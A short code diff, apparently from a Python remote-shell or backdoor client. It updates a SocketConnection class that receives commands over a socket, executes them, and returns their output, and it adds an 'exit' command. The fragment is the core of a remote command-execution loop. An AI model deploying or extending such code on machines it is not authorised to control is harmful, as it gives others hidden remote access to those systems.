@@ -12,14 +12,14 @@ class SocketConnection:
     # Sending Input
     def json_send(self,data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     # Processing Input
     def json_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024).decode()
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -31,7 +31,10 @@ class SocketConnection:
     def start_socket(self):
         while True: # Create infinite loop of execution of commands
             command = self.json_receive()
-            command_output = self.command_execution(command)
+            if command[0] == "exit":
+               self.connection.close()
+               exit()
+            command_output = self.command_execution(command).decode()
             self.json_send(command_output)
         self.connection.close()
 
